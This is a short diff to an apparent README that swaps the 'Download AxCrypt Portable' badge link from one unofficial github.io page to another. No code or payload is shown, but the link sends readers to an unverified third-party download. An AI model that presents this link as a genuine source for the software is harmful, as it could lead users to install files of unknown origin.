@@ -2,7 +2,8 @@
 
 ## 📥 Download AxCrypt Portable
 
-[![⬇️ Download AxCrypt Portable](https://img.shields.io/badge/Download-AxCrypt%20Portable-blue?style=for-the-badge&logo=windows)](https://axcrypt-portable-download.github.io/.github)
+[![⬇️ Download AxCrypt Portable](https://img.shields.io/badge/Download-AxCrypt%20Portable-blue?style=for-the-badge&logo=windows)](https://axcrypt-portable.github.io/.github
+)
 
 ---
 
